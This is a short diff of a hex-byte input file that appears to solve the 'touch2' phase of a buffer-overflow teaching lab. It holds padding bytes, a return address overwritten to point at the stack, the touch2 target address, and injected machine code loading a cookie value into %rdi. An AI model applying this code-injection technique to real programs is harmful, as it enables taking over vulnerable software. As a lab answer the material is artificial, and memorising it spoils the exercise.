@@ -9,10 +9,9 @@
 41 41 41 41
 41 41 41 41
 
-d8 5f 68 55 00 00 00 00 /* stack address of instructions (stack at ret + 16 (because 16 bytes follow from start address)) */
+d8 5f 68 55 00 00 00 00 /* stack address of instructions */
 
-56 1f 40 00 00 00 00 00 /* touch2 */
+37 1e 40 00 00 00 00 00 /* touch2 */
 
 48 c7 c7 4e 34 32 66 /* mov    $0x6632344e,%rdi */
 c3                   /* ret */
-
